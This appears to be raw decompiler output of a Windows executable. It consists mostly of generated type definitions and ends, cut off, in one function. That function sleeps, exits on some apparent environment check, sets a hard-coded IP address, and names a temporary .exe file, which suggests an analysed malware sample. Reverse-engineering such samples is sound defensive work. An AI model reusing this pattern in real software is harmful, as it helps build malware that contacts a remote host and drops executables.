typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef ulonglong __uint64;

typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef ulong DWORD;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef long LONG;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef struct tagMSG *LPMSG;

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef int INT_PTR;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef DWORD LCTYPE;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef void (*_PHNDLR)(int);

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct WSAData WSAData, *PWSAData;

typedef struct WSAData WSADATA;

struct WSAData {
    WORD wVersion;
    WORD wHighVersion;
    char szDescription[257];
    char szSystemStatus[129];
    ushort iMaxSockets;
    ushort iMaxUdpDg;
    char *lpVendorInfo;
};

typedef WSADATA *LPWSADATA;

typedef struct hostent hostent, *Phostent;

struct hostent {
    char *h_name;
    char **h_aliases;
    short h_addrtype;
    short h_length;
    char **h_addr_list;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

struct _s_FuncInfo { // PlaceHolder Structure
};

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

struct _s_HandlerType { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList { // PlaceHolder Structure
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry { // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct bad_alloc bad_alloc, *Pbad_alloc;

struct bad_alloc { // PlaceHolder Structure
};

typedef struct bad_exception bad_exception, *Pbad_exception;

struct bad_exception { // PlaceHolder Structure
};

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef size_t rsize_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef ushort wctype_t;




void FUN_00401000(HINSTANCE param_1,undefined4 param_2,short *param_3)

{
  short sVar1;
  int iVar2;
  DWORD DVar3;
  short *local_23c;
  short *local_238;
  wchar_t local_234;
  undefined local_232 [518];
  uint local_2c;
  undefined4 local_8;
  
  local_2c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_0042c648,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_0042c580,100);
  FUN_00401280(param_1);
  local_238 = param_3;
  local_23c = &DAT_0042d158;
  do {
    sVar1 = *local_238;
    *local_23c = sVar1;
    local_238 = local_238 + 1;
    local_23c = local_23c + 1;
  } while (sVar1 != 0);
  DAT_0042b060 = FUN_00404660();
  Sleep(2000);
  iVar2 = FUN_00401960();
  if (iVar2 != 0) {
    FUN_00404b20();
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  iVar2 = FUN_00401300(param_1);
  if (iVar2 == 0) {
    ___security_check_cookie_4(local_2c ^ (uint)&stack0xfffffffc);
    return;
  }
  local_234 = L'\0';
  _memset(local_232,0,0x206);
  if ((DAT_0042cd98 != 0) && (DAT_0042cd9c != 0)) {
    FUN_004045b0(DAT_0042cd98,s_218_54_31_226_0042b5f8);
    DAT_0042b608 = DAT_0042cd9c;
  }
  DVar3 = GetTickCount();
  local_8 = (undefined4)(((ulonglong)DVar3 / 1000) % 1000);
  FUN_00403c10((wchar_t *)&DAT_0042d360,u_tmp8_X_exe_00428000);
  FUN_00402b40();
  FUN_00403cc0(&local_234);
